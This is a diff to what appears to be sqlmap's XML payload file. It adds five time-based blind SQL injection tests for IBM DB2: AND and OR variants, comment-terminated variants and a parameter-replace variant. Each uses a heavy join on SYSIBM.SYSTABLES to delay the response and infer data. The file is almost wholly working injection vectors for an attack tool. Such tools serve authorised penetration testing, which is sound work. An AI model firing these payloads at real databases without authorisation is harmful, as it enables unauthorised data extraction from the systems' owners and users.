@@ -933,6 +933,84 @@
     </test>
 
     <test>
+        <title>IBM DB2 AND time-based blind (light query)</title>
+        <stype>5</stype>
+        <level>3</level>
+        <risk>2</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>AND [RANDNUM]=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2 WHERE ([INFERENCE]))</vector>
+        <request>
+            <payload>AND [RANDNUM]=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2)</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>IBM DB2</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>IBM DB2 OR time-based blind (light query)</title>
+        <stype>5</stype>
+        <level>3</level>
+        <risk>3</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>OR [RANDNUM]=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2 WHERE ([INFERENCE]))</vector>
+        <request>
+            <payload>OR [RANDNUM]=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2)</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>IBM DB2</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>IBM DB2 AND time-based blind (light query - comment)</title>
+        <stype>5</stype>
+        <level>5</level>
+        <risk>2</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>AND [RANDNUM]=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2 WHERE ([INFERENCE]))</vector>
+        <request>
+            <payload>AND [RANDNUM]=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2)</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>IBM DB2</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>IBM DB2 OR time-based blind (light query - comment)</title>
+        <stype>5</stype>
+        <level>5</level>
+        <risk>3</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>OR [RANDNUM]=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2 WHERE ([INFERENCE]))</vector>
+        <request>
+            <payload>OR [RANDNUM]=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2)</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>IBM DB2</dbms>
+        </details>
+    </test>
+
+    <test>
         <title>IBM DB2 AND time-based blind (heavy query)</title>
         <stype>5</stype>
         <level>3</level>
@@ -1889,6 +1967,25 @@
         </response>
         <details>
             <dbms>SAP MaxDB</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>IBM DB2 time-based blind - Parameter replace (light query)</title>
+        <stype>5</stype>
+        <level>5</level>
+        <risk>2</risk>
+        <clause>1,2,3,9</clause>
+        <where>3</where>
+        <vector>(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2 WHERE ([INFERENCE]))</vector>
+        <request>
+            <payload>(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2)</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>IBM DB2</dbms>
         </details>
     </test>
 
